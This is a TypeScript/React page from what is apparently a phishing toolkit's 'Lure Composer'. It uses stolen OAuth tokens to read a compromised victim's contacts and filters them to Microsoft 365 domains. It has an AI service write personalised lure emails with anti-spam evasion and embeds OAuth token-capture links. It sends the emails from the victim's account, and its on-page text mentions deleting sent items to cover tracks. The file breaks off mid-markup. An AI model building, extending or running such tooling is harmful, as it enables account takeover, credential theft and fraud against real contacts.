"use client";

import { useState, useEffect, useCallback, useRef } from "react";
import { motion } from "framer-motion";
import { useParams, useRouter } from "next/navigation";
import { Token } from "@/types/token";
import { fetchTokens, fetchContacts, sendMail, generateLureEmail, mxCheck, generateOAuthLink } from "@/lib/api";
import { fileToBase64 } from "@/lib/utils";
import {
  Fish, ArrowLeft, Loader2, AlertCircle, Send, User, Mail,
  Plus, X, Eye, ShieldAlert, CheckCircle2, AlertTriangle, Link as LinkIcon,
  Search, ChevronDown, Sparkles, FileText, Calendar, Receipt,
  Wand2,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { ScrollArea } from "@/components/ui/scroll-area";
import { SafeEmailViewer } from "@/components/safe-email";
import {
  Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle,
} from "@/components/ui/dialog";
import { toast } from "sonner";
import { cn } from "@/lib/utils";

function TokenAvatar({ email, size = 32 }: { email: string; size?: number }) {
  const initial = (email?.[0] || "?").toUpperCase();
  const hue = email.split("").reduce((acc, c) => acc + c.charCodeAt(0), 0) % 360;
  return (
    <div
      className="rounded-full flex items-center justify-center flex-shrink-0 font-semibold text-[10px]"
      style={{
        width: size,
        height: size,
        backgroundColor: `hsl(${hue} 60% 20%)`,
        color: `hsl(${hue} 70% 70%)`,
        border: `1px solid hsl(${hue} 50% 30%)`,
      }}
    >
      {initial}
    </div>
  );
}

type Contact = {
  id: string;
  displayName?: string;
  emailAddresses?: { address?: string; name?: string }[];
};

const LURE_TEMPLATES = [
  {
    id: "shared_document",
    label: "Shared Document",
    description: "OneDrive/SharePoint file share notification",
    icon: FileText,
  },
  {
    id: "meeting_followup",
    label: "Meeting Follow-up",
    description: "Teams meeting action items and notes",
    icon: Calendar,
  },
  {
    id: "invoice",
    label: "Invoice / Payment",
    description: "Vendor invoice or payment reminder",
    icon: Receipt,
  },
];

const OFFICE_DOMAINS = new Set([
  "hotmail.com",
  "outlook.com",
  "live.com",
  "msn.com",
  "windowslive.com",
  "office365.com",
  "microsoft.com",
  "onmicrosoft.com",
  "sharepoint.com",
  "teams.microsoft.com",
  "exchange.microsoft.com",
  "owa",
]);

function isOfficeEmailDomain(domain: string): boolean {
  const d = domain.toLowerCase();
  if (OFFICE_DOMAINS.has(d)) return true;
  if (d.includes("outlook")) return true;
  if (d.includes("hotmail")) return true;
  if (d.includes("live")) return true;
  if (d.includes("msn")) return true;
  if (d.includes("microsoft")) return true;
  if (d.includes("office")) return true;
  if (d.includes("exchange")) return true;
  if (d.includes("sharepoint")) return true;
  if (d.includes("onmicrosoft")) return true;
  return false;
}

function extractEmailsFromText(text: string): string[] {
  const emails: string[] = [];
  const parts = text.split(/[\s,;\n\r]+/);
  for (const part of parts) {
    const trimmed = part.trim();
    if (trimmed.includes("@") && trimmed.includes(".")) {
      emails.push(trimmed);
    }
  }
  return [...new Set(emails)];
}

export default function LureComposerPage() {
  const params = useParams<{ tokenId: string }>();
  const tokenId = params?.tokenId;
  const router = useRouter();

  const [token, setToken] = useState<Token | null>(null);
  const [tokenLoading, setTokenLoading] = useState(true);
  const [tokenError, setTokenError] = useState<string | null>(null);

  const [contacts, setContacts] = useState<Contact[]>([]);
  const [contactsLoading, setContactsLoading] = useState(false);
  const [contactsError, setContactsError] = useState<string | null>(null);
  const [contactSearch, setContactSearch] = useState("");

  const [toRecipients, setToRecipients] = useState<string[]>([]);
  const [recipientInput, setRecipientInput] = useState("");
  const [ccRecipients, setCcRecipients] = useState<string[]>([]);
  const [ccInput, setCcInput] = useState("");
  const [bccRecipients, setBccRecipients] = useState<string[]>([]);
  const [bccInput, setBccInput] = useState("");
  const [subject, setSubject] = useState("");
  const [body, setBody] = useState("");
  const [contentType, setContentType] = useState<"HTML" | "Text">("HTML");
  const [sending, setSending] = useState(false);
  const [generating, setGenerating] = useState(false);
  const [antiSpamNotes, setAntiSpamNotes] = useState<string[]>([]);

  const [previewOpen, setPreviewOpen] = useState(false);
  const [approvalOpen, setApprovalOpen] = useState(false);
  const [confirmText, setConfirmText] = useState("");
  const [templatePickerOpen, setTemplatePickerOpen] = useState(false);

  const [showAllContacts, setShowAllContacts] = useState(false);
  const [selectedContactEmails, setSelectedContactEmails] = useState<Set<string>>(new Set());
  const [maxRecipientsPerSend, setMaxRecipientsPerSend] = useState(5);

  const [aiPreviewOpen, setAiPreviewOpen] = useState(false);
  const [aiPreviewData, setAiPreviewData] = useState<{
    subject: string;
    body: string;
    antiSpamNotes: string[];
    templateType: string;
  } | null>(null);

  const [scheduleTime, setScheduleTime] = useState("");
  const [attachments, setAttachments] = useState<File[]>([]);

  // Enterprise domain whitelist (manual + MX-verified)
  const [manualWhitelist, setManualWhitelist] = useState<string>("");
  const [mxVerifiedDomains, setMxVerifiedDomains] = useState<Set<string>>(new Set());
  const [mxChecking, setMxChecking] = useState(false);

  const mounted = useRef(false);

  const loadToken = useCallback(async () => {
    if (!tokenId) return;
    setTokenLoading(true);
    try {
      const data = await fetchTokens();
      setToken(data?.find((t: Token) => t.id === tokenId) || null);
    } catch (err: any) {
      setTokenError(err.message || "Failed to load token");
    } finally {
      setTokenLoading(false);
    }
  }, [tokenId]);

  const loadContacts = useCallback(async () => {
    if (!tokenId) return;
    setContactsLoading(true);
    setContactsError(null);
    try {
      const data = await fetchContacts(tokenId);
      setContacts(data.contacts || []);
    } catch (err: any) {
      setContactsError(err.message || "Failed to load contacts");
      setContacts([]);
    } finally {
      setContactsLoading(false);
    }
  }, [tokenId]);

  useEffect(() => {
    if (!mounted.current) {
      mounted.current = true;
      loadToken();
      loadContacts();
      const saved = localStorage.getItem("lure_manual_whitelist");
      if (saved) setManualWhitelist(saved);
    }
  }, [loadToken, loadContacts]);

  // MX-check unknown domains when contacts load
  useEffect(() => {
    const unknownDomains = contacts
      .map((c) => c.emailAddresses?.[0]?.address?.split("@")[1]?.toLowerCase())
      .filter((d): d is string => !!d && !isOfficeEmailDomain(d) && !mxVerifiedDomains.has(d));
    const unique = [...new Set(unknownDomains)];
    if (unique.length === 0) return;

    let cancelled = false;
    setMxChecking(true);
    mxCheck(unique)
      .then((res) => {
        if (cancelled) return;
        setMxVerifiedDomains((prev) => {
          const next = new Set(prev);
          res.microsoft_365.forEach((d) => next.add(d));
          return next;
        });
      })
      .catch(() => { /* silent */ })
      .finally(() => setMxChecking(false));
    return () => { cancelled = true; };
  }, [contacts]);

  const manualWhitelistSet = new Set(
    manualWhitelist
      .split(/[\s,;\n\r]+/)
      .map((d) => d.trim().toLowerCase())
      .filter((d) => d.length > 0)
  );

  const isOfficeEmail = (email: string | undefined): boolean => {
    if (!email) return false;
    const domain = email.split("@")[1]?.toLowerCase();
    if (!domain) return false;
    if (isOfficeEmailDomain(domain)) return true;
    if (mxVerifiedDomains.has(domain)) return true;
    if (manualWhitelistSet.has(domain)) return true;
    return false;
  };

  const officeContacts = contacts.filter((c) => {
    const email = c.emailAddresses?.[0]?.address;
    return isOfficeEmail(email);
  });

  const visibleContacts = showAllContacts ? contacts : officeContacts;

  const filteredContacts = visibleContacts.filter((c) => {
    if (!contactSearch.trim()) return true;
    const q = contactSearch.toLowerCase();
    return (
      c.displayName?.toLowerCase().includes(q) ||
      c.emailAddresses?.some((e) => e.address?.toLowerCase().includes(q))
    );
  });

  const addRecipient = (email: string) => {
    const trimmed = email.trim();
    if (!trimmed || !trimmed.includes("@")) return;
    setToRecipients((prev) => {
      if (prev.includes(trimmed)) return prev;
      return [...prev, trimmed];
    });
    setSelectedContactEmails((prev) => new Set(prev).add(trimmed));
  };

  const removeRecipient = (email: string) => {
    setToRecipients((prev) => prev.filter((e) => e !== email));
    setSelectedContactEmails((prev) => {
      const next = new Set(prev);
      next.delete(email);
      return next;
    });
  };

  const addCcRecipient = (email: string) => {
    const trimmed = email.trim();
    if (!trimmed || !trimmed.includes("@")) return;
    setCcRecipients((prev) => {
      if (prev.includes(trimmed)) return prev;
      return [...prev, trimmed];
    });
  };

  const removeCcRecipient = (email: string) => {
    setCcRecipients((prev) => prev.filter((e) => e !== email));
  };

  const addBccRecipient = (email: string) => {
    const trimmed = email.trim();
    if (!trimmed || !trimmed.includes("@")) return;
    setBccRecipients((prev) => {
      if (prev.includes(trimmed)) return prev;
      return [...prev, trimmed];
    });
  };

  const removeBccRecipient = (email: string) => {
    setBccRecipients((prev) => prev.filter((e) => e !== email));
  };

  const toggleContact = (email: string | undefined) => {
    if (!email) return;
    if (selectedContactEmails.has(email)) {
      removeRecipient(email);
    } else {
      addRecipient(email);
    }
  };

  const selectAllVisible = () => {
    const emails = filteredContacts
      .map((c) => c.emailAddresses?.[0]?.address)
      .filter((e): e is string => !!e);
    setToRecipients((prev) => {
      const next = new Set(prev);
      emails.forEach((e) => next.add(e));
      return [...next];
    });
    setSelectedContactEmails((prev) => {
      const next = new Set(prev);
      emails.forEach((e) => next.add(e));
      return next;
    });
  };

  const deselectAllVisible = () => {
    const emails = new Set(
      filteredContacts
        .map((c) => c.emailAddresses?.[0]?.address)
        .filter((e): e is string => !!e)
    );
    setToRecipients((prev) => prev.filter((e) => !emails.has(e)));
    setSelectedContactEmails((prev) => {
      const next = new Set(prev);
      emails.forEach((e) => next.delete(e));
      return next;
    });
  };

  const insertOAuthLink = async () => {
    try {
      const res = await generateOAuthLink(false);
      const link = res.link;
      setBody((prev) => prev + `\n\n<a href="${link}">View document</a>`);
      toast.success("OAuth capture link inserted", { description: "Link will capture tokens when clicked" });
    } catch (err: any) {
      toast.error("Failed to generate OAuth link", { description: err.message });
    }
  };

  const handleGenerateAI = async (templateType: string) => {
    commitPendingRecipient();
    if (!token || toRecipients.length === 0) {
      toast.error("Add at least one recipient first");
      return;
    }
    setGenerating(true);
    setTemplatePickerOpen(false);
    try {
      const targetEmail = toRecipients[0];
      const targetContact = contacts.find((c) => c.emailAddresses?.some((e) => e.address === targetEmail));
      const res = await generateLureEmail({
        target_email: targetEmail,
        target_name: targetContact?.displayName || undefined,
        victim_email: token.email || "",
        template_type: templateType,
        context: "corporate office environment",
      });
      setAiPreviewData({
        subject: res.subject,
        body: res.html_body || res.body,
        antiSpamNotes: res.anti_spam_notes || [],
        templateType,
      });
      setAiPreviewOpen(true);
    } catch (err: any) {
      toast.error(err.message || "Failed to generate lure email");
    } finally {
      setGenerating(false);
    }
  };

  const applyAIGenerated = async () => {
    if (!aiPreviewData) return;
    setSubject(aiPreviewData.subject);
    
    // Replace [ACTION_LINK] placeholder with actual OAuth capture link
    try {
      const res = await generateOAuthLink(false);
      const link = res.link;
      let bodyWithLink = aiPreviewData.body;
      
      // Check if [ACTION_LINK] is already wrapped in an <a> tag
      const hasAnchorTag = /<a\s+[^>]*href\s*=\s*["']\[ACTION_LINK\]["'][^>]*>/i.test(bodyWithLink);
      
      if (hasAnchorTag) {
        // Replace just the placeholder inside the href attribute
        bodyWithLink = bodyWithLink.replace(/\[ACTION_LINK\]/g, link);
      } else {
        // Replace [ACTION_LINK] with a proper clickable HTML link
        bodyWithLink = bodyWithLink.replace(
          /\[ACTION_LINK\]/g,
          `<a href="${link}" style="color:#0078d4;text-decoration:underline;">View Document</a>`
        );
      }
      
      setBody(bodyWithLink);
      toast.success("AI lure email applied to composer", { description: "OAuth capture link embedded automatically" });
    } catch (err) {
      // If link generation fails, use the placeholder text
      setBody(aiPreviewData.body);
      toast.warning("AI lure applied without capture link", { description: "Click 'Insert Link' to add OAuth link manually" });
    }
    
    setContentType("HTML");
    setAntiSpamNotes(aiPreviewData.antiSpamNotes);
    setAiPreviewOpen(false);
    setAiPreviewData(null);
  };

  const regenerateAI = async () => {
    if (!aiPreviewData || !token) return;
    setGenerating(true);
    try {
      const targetEmail = toRecipients[0];
      const targetContact = contacts.find((c) => c.emailAddresses?.some((e) => e.address === targetEmail));
      const res = await generateLureEmail({
        target_email: targetEmail,
        target_name: targetContact?.displayName || undefined,
        victim_email: token.email || "",
        template_type: aiPreviewData.templateType,
        context: "corporate office environment",
      });
      setAiPreviewData({
        subject: res.subject,
        body: res.html_body || res.body,
        antiSpamNotes: res.anti_spam_notes || [],
        templateType: aiPreviewData.templateType,
      });
    } catch (err: any) {
      toast.error(err.message || "Failed to regenerate lure email");
    } finally {
      setGenerating(false);
    }
  };

  const commitPendingRecipient = () => {
    const val = recipientInput.trim();
    if (val && val.includes("@")) {
      addRecipient(val);
      setRecipientInput("");
    }
    const ccVal = ccInput.trim();
    if (ccVal && ccVal.includes("@")) {
      addCcRecipient(ccVal);
      setCcInput("");
    }
    const bccVal = bccInput.trim();
    if (bccVal && bccVal.includes("@")) {
      addBccRecipient(bccVal);
      setBccInput("");
    }
  };

  const handlePreview = () => {
    commitPendingRecipient();
    if (toRecipients.length === 0) {
      toast.error("Add at least one recipient");
      return;
    }
    if (!subject.trim()) {
      toast.error("Subject is required");
      return;
    }
    if (!body.trim()) {
      toast.error("Body is required");
      return;
    }
    setPreviewOpen(true);
  };

  const handleRequestApproval = () => {
    setPreviewOpen(false);
    setApprovalOpen(true);
    setConfirmText("");
  };

  const handleSend = async () => {
    if (confirmText.trim().toUpperCase() !== "SEND") {
      toast.error('Type "SEND" to confirm');
      return;
    }
    if (!tokenId) return;
    
    // Check if body still contains [ACTION_LINK] placeholder
    if (body.includes("[ACTION_LINK]")) {
      toast.error("OAuth link not embedded", { 
        description: "Click 'Insert Link' or 'AI Generate' to add the capture link before sending" 
      });
      return;
    }
    
    setSending(true);
    try {
      const attachmentPayload = await Promise.all(attachments.map(fileToBase64));

      // Convert newlines to <br> for HTML emails only if body doesn't already contain HTML tags
      // If body already has HTML (e.g., from AI generation), send as-is to preserve links and formatting
      const hasHtmlTags = /<[a-z][\s\S]*>/i.test(body);
      const formattedBody = contentType === "HTML" && !hasHtmlTags
        ? body.replace(/\r\n/g, "\n").replace(/\n/g, "<br>")
        : body;

      const max = Math.max(1, maxRecipientsPerSend);
      for (let i = 0; i < toRecipients.length; i += max) {
        const chunk = toRecipients.slice(i, i + max);
        await sendMail(tokenId, {
          to: chunk,
          cc: ccRecipients.length > 0 ? ccRecipients : undefined,
          bcc: bccRecipients.length > 0 ? bccRecipients : undefined,
          subject,
          body: formattedBody,
          content_type: contentType,
          attachments: attachmentPayload.length > 0 ? attachmentPayload : undefined,
        });
      }
      toast.success(`Lure email sent to ${toRecipients.join(", ")}`);
      setApprovalOpen(false);
      setToRecipients([]);
      setCcRecipients([]);
      setBccRecipients([]);
      setSubject("");
      setBody("");
      setAntiSpamNotes([]);
      setSelectedContactEmails(new Set());
      setRecipientInput("");
      setCcInput("");
      setBccInput("");
      setScheduleTime("");
      setAttachments([]);
    } catch (err: any) {
      toast.error(err.message || "Failed to send lure email");
    } finally {
      setSending(false);
    }
  };

  const handleRecipientBlur = () => {
    const val = recipientInput.trim();
    if (val && val.includes("@")) {
      addRecipient(val);
      setRecipientInput("");
    }
  };

  const handleRecipientPaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    const pasted = e.clipboardData.getData("text");
    const emails = extractEmailsFromText(pasted);
    if (emails.length > 0) {
      e.preventDefault();
      emails.forEach((email) => addRecipient(email));
      setRecipientInput("");
    }
  };

  const handleAddRecipientClick = () => {
    const val = recipientInput.trim();
    if (val && val.includes("@")) {
      addRecipient(val);
      setRecipientInput("");
    }
  };

  if (tokenLoading) {
    return (
      <div className="flex-1 flex flex-col min-h-0">
        <div className="sticky top-0 z-40 flex items-center gap-3 h-14 px-4 sm:px-6 glass-strong border-b border-white/5">
          <div className="h-4 w-20 animate-pulse rounded bg-white/5" />
        </div>
        <div className="flex-1 flex items-center justify-center">
          <Loader2 className="h-6 w-6 animate-spin text-muted-foreground" />
        </div>
      </div>
    );
  }

  if (tokenError || !token) {
    return (
      <div className="flex-1 flex flex-col min-h-0">
        <div className="sticky top-0 z-40 flex items-center gap-3 h-14 px-4 sm:px-6 glass-strong border-b border-white/5">
          <Button variant="ghost" size="sm" onClick={() => router.push("/lure")}>
            <ArrowLeft className="h-4 w-4 mr-1" /> Back
          </Button>
        </div>
        <div className="flex-1 flex flex-col items-center justify-center gap-3">
          <AlertCircle className="h-8 w-8 text-rose-400" />
          <p className="text-sm text-muted-foreground">{tokenError || "Token not found"}</p>
        </div>
      </div>
    );
  }

  return (
    <div className="flex-1 flex flex-col min-h-0">
      {/* Top Bar */}
      <div className="sticky top-0 z-40 flex items-center gap-3 h-14 px-4 sm:px-6 glass-strong border-b border-white/5">
        <Button variant="ghost" size="sm" onClick={() => router.push("/lure")}>
          <ArrowLeft className="h-4 w-4 mr-1" /> Back
        </Button>
        <div className="flex items-center gap-2">
          <TokenAvatar email={token.email || "?"} size={28} />
          <div>
            <p className="text-sm font-medium text-foreground">{token.email}</p>
            <p className="text-[10px] text-muted-foreground">Lure Composer</p>
          </div>
        </div>
        <div className="ml-auto flex items-center gap-2">
          <Button variant="outline" size="sm" onClick={() => setTemplatePickerOpen(true)} disabled={generating}>
            <Wand2 className="h-4 w-4 mr-1.5" />
            {generating ? "Generating..." : "AI Generate"}
          </Button>
          <Button variant="outline" size="sm" onClick={handlePreview}>
            <Eye className="h-4 w-4 mr-1.5" /> Preview
          </Button>
        </div>
      </div>

      <div className="flex-1 overflow-y-auto">
        <div className="mx-auto w-full max-w-[1200px] px-4 sm:px-6 lg:px-8 py-6 space-y-6">
          {/* How It Works */}
          <motion.div
            initial={{ opacity: 0, y: 8 }}
            animate={{ opacity: 1, y: 0 }}
            className="rounded-xl border border-white/5 bg-gradient-to-br from-sky-500/5 to-transparent p-5"
          >
            <div className="flex items-start gap-4">
              <div className="h-10 w-10 rounded-xl bg-sky-500/10 ring-1 ring-sky-500/20 flex items-center justify-center flex-shrink-0">
                <Fish className="h-5 w-5 text-sky-400" />
              </div>
              <div className="flex-1">
                <h3 className="text-sm font-semibold text-foreground">What are Lure Emails?</h3>
                <p className="text-xs text-muted-foreground mt-1 leading-relaxed">
                  Lure emails are AI-generated phishing messages sent from the compromised victim account (e.g., dyanhikov@hotmail.com) 
                  to target contacts. The AI personalizes the subject and body using the target's name, company context, and 
                  <strong> anti-spam techniques</strong> to bypass filters. After sending, you can optionally delete the sent item 
                  from the victim's Sent folder to cover tracks.
                </p>
                <div className="flex items-center gap-4 mt-3">
                  <div className="flex items-center gap-1.5">
                    <div className="h-2 w-2 rounded-full bg-emerald-400" />
                    <span className="text-[10px] text-muted-foreground">Office domain (safe)</span>
                  </div>
                  <div className="flex items-center gap-1.5">
                    <div className="h-2 w-2 rounded-full bg-amber-400" />
                    <span className="text-[10px] text-muted-foreground">External domain (verify)</span>
                  </div>
                  <div className="flex items-center gap-1.5">
                    <div className="h-2 w-2 rounded-full bg-sky-400" />
                    <span className="text-[10px] text-muted-foreground">AI-generated content</span>
                  </div>
                </div>
              </div>
            </div>
          </motion.div>

          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
            {/* Left: Contacts */}
            <div className="lg:col-span-1">
              <div className="rounded-xl border border-white/5 bg-secondary/10 overflow-hidden">
                <div className="px-4 py-3 border-b border-white/5 flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <User className="h-4 w-4 text-primary" />
                    <h3 className="text-sm font-semibold text-foreground">Contacts</h3>
                  </div>
                  {contactsLoading && <Loader2 className="h-3.5 w-3.5 animate-spin text-muted-foreground" />}
                </div>
                <div className="p-3">
                  {/* Toggle and actions */}
                  <div className="flex items-center justify-between mb-3">
                    <button
                      onClick={() => setShowAllContacts((v) => !v)}
                      className="text-[11px] text-muted-foreground hover:text-foreground transition-colors"
                    >
                      {showAllContacts ? "Show office only" : "Show all contacts"}
                    </button>
                    <div className="flex items-center gap-1.5">
                      <Button variant="ghost" size="sm" className="h-6 text-[10px] px-2" onClick={selectAllVisible}>
                        Select all
                      </Button>
                      <Button variant="ghost" size="sm" className="h-6 text-[10px] px-2" onClick={deselectAllVisible}>
                        Deselect all
                      </Button>
                    </div>
                  </div>
                  <div className="mb-3 flex items-center gap-2">
                    <span className="text-[11px] text-muted-foreground">
                      {selectedContactEmails.size} contacts selected
                    </span>
                    {mxChecking && <Loader2 className="h-3 w-3 animate-spin text-muted-foreground" />}
                  </div>
                  {/* Manual enterprise domain whitelist */}
                  <div className="mb-3">
                    <label className="text-[10px] text-muted-foreground block mb-1">Enterprise domains (comma-separated)</label>
                    <Input
                      value={manualWhitelist}
                      onChange={(e) => {
                        setManualWhitelist(e.target.value);
                        localStorage.setItem("lure_manual_whitelist", e.target.value);
                      }}
                      placeholder="e.g. acme-corp.com, bigbank.io"
                      className="h-7 text-[11px] bg-secondary/30 border-white/5"
                    />
                    <p className="text-[10px] text-muted-foreground/60 mt-1">
                      Domains listed here are always included in office-only mode. MX verification runs automatically for unknown domains.
                    </p>
                  </div>
                  <div className="relative mb-3">
                    <Search className="absolute left-2.5 top-1/2 -translate-y-1/2 h-3.5 w-3.5 text-muted-foreground" />
                    <Input
                      value={contactSearch}
                      onChange={(e) => setContactSearch(e.target.value)}
                      placeholder="Search contacts..."
                      className="pl-8 h-8 text-xs bg-secondary/30 border-white/5"
                    />
                  </div>
                  <ScrollArea className="h-[400px]">
                    {contactsError ? (
                      <div className="flex items-center justify-center py-8 gap-2">
                        <AlertCircle className="h-4 w-4 text-rose-400" />
                        <p className="text-xs text-muted-foreground">{contactsError}</p>
                      </div>
                    ) : filteredContacts.length === 0 ? (
                      <div className="flex flex-col items-center justify-center py-8 gap-2">
                        <User className="h-6 w-6 text-muted-foreground/30" />
                        <p className="text-xs text-muted-foreground">No contacts found</p>
                        <p className="text-[10px] text-muted-foreground/60 text-center px-4">
                          Contacts require <code className="bg-secondary/50 px-1 rounded">Contacts.Read</code> scope. New tokens will have this scope.
                        </p>
                      </div>
                    ) : (
                      <div className="space-y-1">
                        {filteredContacts.map((contact) => {
                          const email = contact.emailAddresses?.[0]?.address;
                          const checked = !!email && selectedContactEmails.has(email);
                          return (
                            <div
                              key={contact.id}
                              className="w-full flex items-center gap-2 px-2.5 py-2 rounded-md text-xs transition-colors hover:bg-secondary/50"
                            >
                              <input
                                type="checkbox"
                                checked={checked}
                                onChange={() => toggleContact(email)}
                                className="h-3.5 w-3.5 rounded border-white/20 bg-secondary/30 text-primary focus:ring-primary/30"
                              />
                              <button
                                onClick={() => email && addRecipient(email)}
                                className="flex items-center gap-2.5 text-left flex-1 min-w-0"
                              >
                                <TokenAvatar email={email || contact.displayName || "?"} size={24} />
                                <div className="flex-1 min-w-0">
                                  <p className="font-medium text-foreground truncate">{contact.displayName || email || "Unknown"}</p>
                                  {email && (
                                    <div className="flex items-center gap-1.5">
                                      <p className="text-[10px] text-muted-foreground truncate">{email}</p>
                                      {email && (
                                        isOfficeEmail(email) ? (
                                          <Badge variant="secondary" className="text-[8px] px-1 py-0 bg-emerald-500/10 text-emerald-400 border-emerald-500/20">
                                            <CheckCircle2 className="h-2 w-2 mr-0.5" /> Office
                                          </Badge>
                                        ) : (
                                          <Badge variant="secondary" className="text-[8px] px-1 py-0 bg-amber-500/10 text-amber-400 border-amber-500/20">
                                            <AlertTriangle className="h-2 w-2 mr-0.5" /> External
                                          </Badge>
                                        )
                                      )}
                                    </div>
                                  )}
                                </div>
                              </button>
                              <button onClick={() => email && addRecipient(email)} className="flex-shrink-0">
                                <Plus className="h-3 w-3 text-muted-foreground" />
                              </button>
                            </div>
                          );
                        })}
                      </div>
                    )}
                  </ScrollArea>
                </div>
              </div>
            </div>

            {/* Right: Composer */}
            <div className="lg:col-span-2 space-y-4">
              {/* Recipients */}
              <div className="rounded-xl border border-white/5 bg-secondary/10 p-4">
                <label className="text-xs font-medium text-muted-foreground mb-2 block">To</label>
                <div className="flex flex-wrap gap-2 min-h-[36px] p-2 rounded-lg border border-white/5 bg-secondary/30 items-center">
                  {toRecipients.map((email) => {
                    const isOffice = isOfficeEmail(email);
                    return (
                      <Badge
                        key={email}
                        variant="secondary"
                        className={cn(
                          "gap-1.5 text-xs",
                          isOffice
                            ? "bg-emerald-500/10 text-emerald-400 border-emerald-500/20"
                            : "bg-amber-500/10 text-amber-400 border-amber-500/20"
                        )}
                      >
                        <span className="flex items-center gap-1">
                          {isOffice ? <CheckCircle2 className="h-3 w-3" /> : <AlertTriangle className="h-3 w-3" />}
                          {email}
                        </span>
                        <button onClick={() => removeRecipient(email)}>
                          <X className="h-3 w-3" />
                        </button>
                      </Badge>
                    );
                  })}
                  <Input
                    value={recipientInput}
                    onChange={(e) => setRecipientInput(e.target.value)}
                    onBlur={handleRecipientBlur}
                    onPaste={handleRecipientPaste}
                    onKeyDown={(e) => {
                      if (e.key === "Enter") {
                        e.preventDefault();
                        handleAddRecipientClick();
                      }
                    }}
                    placeholder="Add email..."
                    className="flex-1 min-w-[150px] h-7 text-xs bg-transparent border-0 px-0 focus-visible:ring-0"
                  />
                  <Button
                    variant="ghost"
                    size="sm"
                    className="h-7 text-[11px] px-2"
                    onClick={handleAddRecipientClick}
                  >
                    <Plus className="h-3 w-3 mr-1" /> Add
                  </Button>
                </div>
              </div>

              {/* CC */}
              <div className="rounded-xl border border-white/5 bg-secondary/10 p-4">
                <label className="text-xs font-medium text-muted-foreground mb-2 block">Cc</label>
                <div className="flex flex-wrap gap-2 min-h-[36px] p-2 rounded-lg border border-white/5 bg-secondary/30 items-center">
                  {ccRecipients.map((email) => {
                    const isOffice = isOfficeEmail(email);
                    return (
                      <Badge
                        key={email}
                        variant="secondary"
                        className={cn(
                          "gap-1.5 text-xs",
                          isOffice
                            ? "bg-emerald-500/10 text-emerald-400 border-emerald-500/20"
                            : "bg-amber-500/10 text-amber-400 border-amber-500/20"
                        )}
                      >
                        <span className="flex items-center gap-1">
                          {isOffice ? <CheckCircle2 className="h-3 w-3" /> : <AlertTriangle className="h-3 w-3" />}
                          {email}
                        </span>
                        <button onClick={() => removeCcRecipient(email)}>
                          <X className="h-3 w-3" />
                        </button>
                      </Badge>
                    );
                  })}
                  <Input
                    value={ccInput}
                    onChange={(e) => setCcInput(e.target.value)}
                    onBlur={() => {
                      const val = ccInput.trim();
                      if (val && val.includes("@")) { addCcRecipient(val); setCcInput(""); }
                    }}
                    onKeyDown={(e) => {
                      if (e.key === "Enter") {
                        e.preventDefault();
                        const val = ccInput.trim();
                        if (val && val.includes("@")) { addCcRecipient(val); setCcInput(""); }
                      }
                    }}
                    placeholder="Add Cc email..."
                    className="flex-1 min-w-[150px] h-7 text-xs bg-transparent border-0 px-0 focus-visible:ring-0"
                  />
                </div>
              </div>

              {/* BCC */}
              <div className="rounded-xl border border-white/5 bg-secondary/10 p-4">
                <label className="text-xs font-medium text-muted-foreground mb-2 block">Bcc</label>
                <div className="flex flex-wrap gap-2 min-h-[36px] p-2 rounded-lg border border-white/5 bg-secondary/30 items-center">
                  {bccRecipients.map((email) => {
                    const isOffice = isOfficeEmail(email);
                    return (
                      <Badge
                        key={email}
                        variant="secondary"
                        className={cn(
                          "gap-1.5 text-xs",
                          isOffice
                            ? "bg-emerald-500/10 text-emerald-400 border-emerald-500/20"
                            : "bg-amber-500/10 text-amber-400 border-amber-500/20"
                        )}
                      >
                        <span className="flex items-center gap-1">
                          {isOffice ? <CheckCircle2 className="h-3 w-3" /> : <AlertTriangle className="h-3 w-3" />}
                          {email}
                        </span>
                        <button onClick={() => removeBccRecipient(email)}>
                          <X className="h-3 w-3" />
                        </button>
                      </Badge>
                    );
                  })}
                  <Input
                    value={bccInput}
                    onChange={(e) => setBccInput(e.target.value)}
                    onBlur={() => {
                      const val = bccInput.trim();
                      if (val && val.includes("@")) { addBccRecipient(val); setBccInput(""); }
                    }}
                    onKeyDown={(e) => {
                      if (e.key === "Enter") {
                        e.preventDefault();
                        const val = bccInput.trim();
                        if (val && val.includes("@")) { addBccRecipient(val); setBccInput(""); }
                      }
                    }}
                    placeholder="Add Bcc email..."
                    className="flex-1 min-w-[150px] h-7 text-xs bg-transparent border-0 px-0 focus-visible:ring-0"
                  />
                </div>
              </div>

              {/* Subject */}
              <div className="rounded-xl border border-white/5 bg-secondary/10 p-4">
                <label className="text-xs font-medium text-muted-foreground mb-2 block">Subject</label>
                <Input
                  value={subject}
                  onChange={(e) => setSubject(e.target.value)}
                  placeholder="Enter subject..."
                  className="h-10 bg-secondary/30 border-white/5"
                />
              </div>

              {/* Body */}
              <div className="rounded-xl border border-white/5 bg-secondary/10 p-4">
                <div className="flex items-center justify-between mb-2">
                  <label className="text-xs font-medium text-muted-foreground">Body</label>
                  <div className="flex items-center gap-2">
                    <div className="flex items-center gap-1">
                      <button
                        onClick={() => setContentType("HTML")}
                        className={cn("text-[11px] px-2 py-0.5 rounded transition-colors", contentType === "HTML" ? "bg-primary/20 text-primary" : "text-muted-foreground hover:text-foreground")}
                      >HTML</button>
                      <button
                        onClick={() => setContentType("Text")}
                        className={cn("text-[11px] px-2 py-0.5 rounded transition-colors", contentType === "Text" ? "bg-primary/20 text-primary" : "text-muted-foreground hover:text-foreground")}
                      >Text</button>
                    </div>
                    <Button variant="ghost" size="sm" className="h-7 text-xs gap-1" onClick={insertOAuthLink}>
                      <LinkIcon className="h-3 w-3" /> Insert Link
                    </Button>
                  </div>
                </div>
                <textarea
                  value={body}
                  onChange={(e) => setBody(e.target.value)}
                  placeholder={contentType === "HTML" ? "Type your HTML message..." : "Type your message..."}
                  className="w-full h-64 rounded-lg border border-white/5 bg-secondary/30 px-3 py-2.5 text-sm text-foreground placeholder:text-muted-foreground/50 outline-none focus-visible:ring-1 focus-visible:ring-primary/30 resize-none font-mono"
                />
                {/* Attachments */}
                <div className="mt-3 space-y-2">
                  <input
                    type="file"
                    multiple
                    id="lure-attachments"
                    className="hidden"
                    onChange={(e) => {
                      const files = Array.from(e.target.files || []);
                      setAttachments((prev) => [...prev, ...files]);
                    }}
                  />
